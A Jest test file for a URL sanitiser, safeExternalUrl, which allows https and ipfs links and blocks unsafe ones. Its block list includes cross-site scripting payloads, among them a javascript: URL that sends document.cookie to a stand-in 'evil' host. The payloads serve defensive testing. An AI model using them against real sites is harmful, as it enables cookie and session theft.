import { safeExternalUrl } from "../safeUrl";

describe("safeExternalUrl", () => {
  it.each([
    ["https://example.com/token-metadata.json", "https://example.com/token-metadata.json"],
    ["HTTPS://Example.com/meta.json", "https://example.com/meta.json"],
    ["  https://example.com  ", "https://example.com/"],
    [
      "ipfs://bafybeigdyrzt5sfp7udm7hu76uh7y26nf3efuylqabf3oclgtqy55fbzdi/metadata.json",
      "ipfs://bafybeigdyrzt5sfp7udm7hu76uh7y26nf3efuylqabf3oclgtqy55fbzdi/metadata.json",
    ],
  ])("allows %j", (raw, expected) => {
    expect(safeExternalUrl(raw)).toBe(expected);
  });

  it.each([
    "javascript:alert(1)",
    "JavaScript:fetch('https://evil/'+document.cookie)",
    " javascript:alert(1)",
    "java\tscript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "vbscript:msgbox(1)",
    "http://example.com",
    "https:example.com",
    "//example.com",
    "/relative/path",
    "https://",
    "ipfs://",
    "https://example.com/a b",
    "https://example.com/\u0000",
    "",
    "not a url",
  ])("blocks %j", (raw) => {
    expect(safeExternalUrl(raw)).toBeNull();
  });

  it("blocks non-strings", () => {
    expect(safeExternalUrl(undefined)).toBeNull();
    expect(safeExternalUrl(null)).toBeNull();
  });
});
